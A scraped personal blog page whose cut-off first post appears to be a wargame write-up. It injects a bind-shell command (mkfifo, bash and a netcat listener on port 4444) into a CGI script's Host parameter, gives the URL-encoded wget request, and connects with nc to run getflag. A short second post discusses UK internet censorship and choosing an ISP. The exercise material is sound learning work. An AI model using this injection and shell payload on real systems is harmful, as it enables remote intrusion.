<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">ping</span> <span style="color: #660033;">-c</span> <span style="color: #000000;">3</span> ;<span style="color: #c20cb9; font-weight: bold;">mkfifo</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe<span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">bash</span><span style="color: #000000; font-weight: bold;">|</span>nc <span style="color: #660033;">-l</span> <span style="color: #000000;">4444</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">&amp;</span>amp;<span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>fifo; <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">&amp;</span>amp;<span style="color: #000000;">1</span></pre></td></tr></table>
<p class="theCode" style="display:none;">ping -c 3 ;mkfifo /tmp/pipe;cat /tmp/pipe|bash|nc -l 4444 2&amp;gt;&amp;amp;1&amp;gt;/tmp/pipe;rm /tmp/fifo; 2&amp;gt;&amp;amp;1</p>
</div>

<p>This is quite a command, so I&#8217;ll break it down:</p>
<ul>
<li>
<strong>ping -c 3 ;</strong> &#8211; This command will fail because there is no host given, but we don&#8217;t care about that</li>
<li>
<strong>mkfifo /tmp/pipe;</strong> &#8211; Make a special &#8220;pipe&#8221; file in /tmp/pipe, I&#8217;ll explain why later&#8230;</li>
<li>
<strong>cat /tmp/pipe|bash|nc -l 4444 2&gt;&amp;1&gt;/tmp/pipe;</strong> &#8211; this reads data from the /tmp/pipe and sends it to /bin/bash, which sends it&#8217;s output to nc, which is listening on port 4444, which then sends it&#8217;s output (stdout and stderr) back to /tmp/pipe.</li>
<li>
<strong>rm /tmp/fifo;</strong> &#8211; clear up the pipe file after nc has closed.</li>
<li>
<strong>2&gt;&amp;1</strong> &#8211; Redirects stderr to stdout. This is just left over from the perl script&#8217;s command, we don&#8217;t care about it really.</li>
</ul>
<p>This should set up a netcat process listening on TCP port 4444 that will accept data (in our case this will be bash commands) from the network and send it to /tmp/pipe. cat will read data from /tmp/pipe and send it to bash, which will send it&#8217;s output to netcat, which will in turn send that back over the network. A kind of remote shell. Passing input/output of netcat and bash in this circular fashion is only possible by way of a fifo pipe and the cat command.</p>
<p>Obviously I&#8217;ll have to URL encode my host variable, so my whole command becomes:</p>

<div class="wp_syntax" style="position:relative;">
<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O-</span> http:<span style="color: #000000; font-weight: bold;">//</span>localhost:<span style="color: #000000;">7007</span><span style="color: #000000; font-weight: bold;">/</span>index.cgi?<span style="color: #007800;">Host</span>=<span style="color: #000000; font-weight: bold;">%</span>3Bmkfifo<span style="color: #000000; font-weight: bold;">%</span>20<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Fpipe<span style="color: #000000; font-weight: bold;">%</span>3Bcat<span style="color: #000000; font-weight: bold;">%</span>20<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Fpipe<span style="color: #000000; font-weight: bold;">%</span>7Cbash<span style="color: #000000; font-weight: bold;">%</span>7Cnc<span style="color: #000000; font-weight: bold;">%</span>20-l<span style="color: #000000; font-weight: bold;">%</span>204444<span style="color: #000000; font-weight: bold;">%</span>202<span style="color: #000000; font-weight: bold;">%</span>3E<span style="color: #000000; font-weight: bold;">%</span>261<span style="color: #000000; font-weight: bold;">%</span>3E<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Fpipe<span style="color: #000000; font-weight: bold;">%</span>3Brm<span style="color: #000000; font-weight: bold;">%</span>20<span style="color: #000000; font-weight: bold;">%</span>2Ftmp<span style="color: #000000; font-weight: bold;">%</span>2Ffifo<span style="color: #000000; font-weight: bold;">%</span>3B</pre></td></tr></table>
<p class="theCode" style="display:none;">wget -O- http://localhost:7007/index.cgi?Host=%3Bmkfifo%20%2Ftmp%2Fpipe%3Bcat%20%2Ftmp%2Fpipe%7Cbash%7Cnc%20-l%204444%202%3E%261%3E%2Ftmp%2Fpipe%3Brm%20%2Ftmp%2Ffifo%3B</p>
</div>

<p>Now I just connect from another tty session or another machine on the network (though you&#8217;ll have to edit the command if you do that) using:</p>

<div class="wp_syntax" style="position:relative;">
<table><tr><td class="code"><pre class="bash" style="font-family:monospace;">nc localhost <span style="color: #000000;">4444</span></pre></td></tr></table>
<p class="theCode" style="display:none;">nc localhost 4444</p>
</div>

<p>Now I can run any command including whoami and getflag</p>
					</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
							
										
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-218 -->

				
					
	<article id="post-128" class="post-128 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/internet-censorship/" rel="bookmark">Internet censorship</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/internet-censorship/" title="8:23 AM" rel="bookmark"><time class="entry-date" datetime="2012-10-08T08:23:06+00:00">2012-10-08</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
						<div class="comments-link">
				<a href="/blog/internet-censorship/#respond"><span class="leave-reply">Reply</span></a>			</div>
					</header><!-- .entry-header -->

				<div class="entry-content">
			<p>My Finacee and I used to live on a farm just north of Bristol where the broadband options were pretty slim. While my friend in a town closer to London was getting 70Mb/s downstream, we were only offered 0.5Mb/s. I ended up getting a 3G dongle with a wireless 3G router and using HSPA+ on the three.co.uk network and we regularly managed speeds of around 7Mb/s (around 14x faster than we would have got if we used the phone line).</p>
<p>We moved, this weekend, to a town closer to London, and I have left the dongle with the new tennants at the farm. I am currently researching what ISP I should go with. While looking at an ISP that I had been recommended (because of their technical expertise and support) I noticed a link to an article about the web censorship we are currently facing in the UK, and the reason that they do not censor on their network.</p>
<p>It was not news to me, but I found it an interesting read anyway.</p>
<p><a href="http://www.aa.net.uk/news-censorship.html" title="Article on Internet Censorship" target="_blank">The article can be found here</a>.</p>
					</div>
<!-- .entry-content -->
		
		<footer class="entry-meta">
			
										<span class="cat-links">
					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/blog/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
							
										
										<span class="sep"> | </span>
						<span class="comments-link"><a href="/blog/internet-censorship/#respond"><span class="leave-reply">Leave a reply</span></a></span>
			
					</footer><!-- .entry-meta -->
	</article><!-- #post-128 -->

				
				
			
			</div>
<!-- #content -->
		</section><!-- #primary -->

		<div id="secondary" class="widget-area" role="complementary">
			<aside id="rss-2" class="widget widget_rss"><h3 class="widget-title">
<a class="rsswidget rss-widget-feed" href="/blog/?feed=rss"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="/blog/wp-includes/images/rss.png" alt="RSS" loading="lazy"></a> <a class="rsswidget rss-widget-title" href="/blog/">grobinson.me RSS feed</a>
</h3>
<ul><li><a class="rsswidget" href="/blog/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a></li></ul></aside>
		<aside id="recent-posts-2" class="widget widget_recent_entries">
		<h3 class="widget-title">Recent Posts</h3>
		<ul>
											<li>
					<a href="/blog/learning-more-about-buffer-overflow-exploits/">Learning more about buffer overflow exploits</a>
									</li>
											<li>
					<a href="/blog/reverse-shells-even-without-nc-on-linux/">Reverse shells even without nc on Linux</a>
									</li>
											<li>
					<a href="/blog/i-discovered-a-vulnerability-in-a-wordpress-plugin/">I discovered a vulnerability in a wordpress plugin</a>
									</li>
											<li>
					<a href="/blog/i-passed-oscp/">I passed OSCP!</a>
									</li>
											<li>
					<a href="/blog/fristileaks-1-3/">FristiLeaks 1.3</a>
									</li>
					</ul>

		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3>
<ul id="recentcomments">
<li class="recentcomments">
<span class="comment-author-link"><a href="/blog/" class="url" rel="ugc">Graeme Robinson</a></span> on <a href="/blog/single-line-php-script-to-gain-shell/#comment-5077679">Single Line PHP Script to Gain Shell</a>
</li>
<li class="recentcomments">
<span class="comment-author-link">Daniel</span> on <a href="/blog/single-line-php-script-to-gain-shell/#comment-5061347">Single Line PHP Script to Gain Shell</a>
</li>
<li class="recentcomments">
<span class="comment-author-link"><a href="https://www.instagram.com/endego.dj/" class="url" rel="ugc external nofollow">Errorgedill</a></span> on <a href="/blog/learning-more-about-buffer-overflow-exploits/#comment-5021162">Learning more about buffer overflow exploits</a>
</li>
<li class="recentcomments">
<span class="comment-author-link"><a href="/blog/reverse-shells-even-without-nc-on-linux/" class="url" rel="ugc">Reverse shells even without nc on Linux | Graeme Robinson&#039;s blog</a></span> on <a href="/blog/single-line-php-script-to-gain-shell/#comment-4568725">Single Line PHP Script to Gain Shell</a>
</li>
<li class="recentcomments">
<span class="comment-author-link"><a href="/blog/i-passed-oscp/" class="url" rel="ugc">I passed OSCP! | Graeme Robinson&#039;s blog</a></span> on <a href="/blog/ive-signed-up-to-the-penetration-testing-with-kali-linux-course-oscp/#comment-4568721">I&#8217;ve signed up to the Penetration testing with Kali Linux Course (OSCP)</a>
</li>
</ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
			<ul>
					<li><a href="/blog/2018/07/">July 2018</a></li>
	<li><a href="/blog/2018/04/">April 2018</a></li>
	<li><a href="/blog/2017/10/">October 2017</a></li>
	<li><a href="/blog/2017/08/">August 2017</a></li>
	<li><a href="/blog/2017/06/">June 2017</a></li>
	<li><a href="/blog/2016/08/">August 2016</a></li>
	<li><a href="/blog/2014/11/">November 2014</a></li>
	<li><a href="/blog/2013/01/">January 2013</a></li>
	<li><a href="/blog/2012/12/">December 2012</a></li>
	<li><a href="/blog/2012/11/">November 2012</a></li>
	<li><a href="/blog/2012/10/">October 2012</a></li>
	<li><a href="/blog/2012/09/">September 2012</a></li>
	<li><a href="/blog/2012/08/">August 2012</a></li>
			</ul>

			</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
			<ul>
					<li class="cat-item cat-item-47">
<a href="/blog/category/ios/jailbreak/appsync/">AppSync</a>
</li>
	<li class="cat-item cat-item-16">
<a href="/blog/category/infosec/hash/crack/brute-force/">Brute Force</a>
</li>
	<li class="cat-item cat-item-62">
<a href="/blog/category/exploit/exploit-development/buffer-overflow/">Buffer Overflow</a>
</li>
	<li class="cat-item cat-item-55">
<a href="/blog/category/career/">Career</a>
</li>
	<li class="cat-item cat-item-20">
<a href="/blog/category/comic/">Comic</a>
</li>
	<li class="cat-item cat-item-35">
<a href="/blog/category/infosec/compromise/">Compromise</a>
</li>
	<li class="cat-item cat-item-52">
<a href="/blog/category/infosec/conference/">Conference</a>
</li>
	<li class="cat-item cat-item-13">
<a href="/blog/category/infosec/hash/crack/">Crack</a>
</li>
	<li class="cat-item cat-item-48">
<a href="/blog/category/development/">Development</a>
</li>
	<li class="cat-item cat-item-41">
<a href="/blog/category/education/">Education</a>
</li>
	<li class="cat-item cat-item-27">
<a href="/blog/category/email/">Email</a>
</li>
	<li class="cat-item cat-item-5">
<a href="/blog/category/infosec/encryption/">Encryption</a>
</li>
	<li class="cat-item cat-item-30">
<a href="/blog/category/exploit/">Exploit</a>
</li>
	<li class="cat-item cat-item-40">
<a href="/blog/category/exploit-excercises/">Exploit Excercises</a>
</li>
	<li class="cat-item cat-item-58">
<a href="/blog/category/exploit/exploit-db/">exploit-db</a>
</li>
	<li class="cat-item cat-item-21">
<a href="/blog/category/os-x/filevault/">FileVault</a>
</li>
	<li class="cat-item cat-item-24">
<a href="/blog/category/infosec/encryption/full-disk-encryption/">Full Disk Encryption</a>
</li>
	<li class="cat-item cat-item-36">
<a href="/blog/category/passwords/google-authenticator/">Google Authenticator</a>
</li>
	<li class="cat-item cat-item-9">
<a href="/blog/category/infosec/hash/">Hash</a>
</li>
	<li class="cat-item cat-item-14">
<a href="/blog/category/infosec/hash/crack/hashcat/">HashCat</a>
</li>
	<li class="cat-item cat-item-25">
<a href="/blog/category/email/hotmail/">Hotmail</a>
</li>
	<li class="cat-item cat-item-61">
<a href="/blog/category/exploit/exploit-development/immunity/">Immunity</a>
</li>
	<li class="cat-item cat-item-4">
<a href="/blog/category/infosec/">Information Security</a>
</li>
	<li class="cat-item cat-item-45">
<a href="/blog/category/ios/">iOS</a>
</li>
	<li class="cat-item cat-item-46">
<a href="/blog/category/ios/jailbreak/">JailBreak</a>
</li>
	<li class="cat-item cat-item-8">
<a href="/blog/category/infosec/hash/crack/john-the-ripper/">John The Ripper</a>
</li>
	<li class="cat-item cat-item-57">
<a href="/blog/category/kali/">Kali</a>
</li>
	<li class="cat-item cat-item-33">
<a href="/blog/category/passwords/lastpass/">LastPass</a>
</li>
	<li class="cat-item cat-item-37">
<a href="/blog/category/lesson-learned/">Lesson Learned</a>
</li>
	<li class="cat-item cat-item-39">
<a href="/blog/category/unix/linux/">Linux</a>
</li>
	<li class="cat-item cat-item-60">
<a href="/blog/category/exploit/exploit-development/mona-py/">mona.py</a>
</li>
	<li class="cat-item cat-item-42">
<a href="/blog/category/education/online-course/">Online Course</a>
</li>
	<li class="cat-item cat-item-23">
<a href="/blog/category/os-x/">OS X</a>
</li>
	<li class="cat-item cat-item-53">
<a href="/blog/category/education/online-course/oscp/">OSCP</a>
</li>
	<li class="cat-item cat-item-19">
<a href="/blog/category/passwords/password-complexity/">Password Complexity</a>
</li>
	<li class="cat-item cat-item-32">
<a href="/blog/category/passwords/password-reuse/">Password Reuse</a>
</li>
	<li class="cat-item cat-item-18">
<a href="/blog/category/passwords/">Passwords</a>
</li>
	<li class="cat-item cat-item-7">
<a href="/blog/category/infosec/pentest/">Penetration Test</a>
</li>
	<li class="cat-item cat-item-29">
<a href="/blog/category/php/">PHP</a>
</li>
	<li class="cat-item cat-item-44">
<a href="/blog/category/passwords/plaintext/">Plaintext</a>
</li>
	<li class="cat-item cat-item-56">
<a href="/blog/category/pwk/">PWK</a>
</li>
	<li class="cat-item cat-item-54">
<a href="/blog/category/development/python/">Python</a>
</li>
	<li class="cat-item cat-item-15">
<a href="/blog/category/infosec/hash/salt/">Salt</a>
</li>
	<li class="cat-item cat-item-28">
<a href="/blog/category/shell/">Shell</a>
</li>
	<li class="cat-item cat-item-43">
<a href="/blog/category/education/online-course/stanford-online/">Stanford Online</a>
</li>
	<li class="cat-item cat-item-1 current-cat">
<a aria-current="page" href="/blog/category/uncategorized/">Uncategorized</a>
</li>
	<li class="cat-item cat-item-38">
<a href="/blog/category/unix/">Unix</a>
</li>
	<li class="cat-item cat-item-31">
<a href="/blog/category/web-server/">Web Server</a>
</li>
	<li class="cat-item cat-item-6">
<a href="/blog/category/infosec/webapp/">WebApp</a>
</li>
	<li class="cat-item cat-item-51">
<a href="/blog/category/infosec/white-hat/">White Hat</a>
</li>
	<li class="cat-item cat-item-34">
<a href="/blog/category/infosec/webapp/windows-live/">Windows Live</a>
</li>
	<li class="cat-item cat-item-49">
<a href="/blog/category/development/xcode/">XCode</a>
</li>
	<li class="cat-item cat-item-26">
<a href="/blog/category/comic/xkcd/">XKCD</a>
</li>
			</ul>

			</aside>		</div>
<!-- #secondary .widget-area -->

	</div>
<!-- #main -->

	<footer id="colophon">

			

			<div id="site-generator">
												<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
					Proudly powered by WordPress				</a>
			</div>
	</footer><!-- #colophon -->
</div>
<!-- #page -->

<script type="text/javascript" src="/blog/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.2" id="wp-syntax-js-js"></script>

</body>
</html>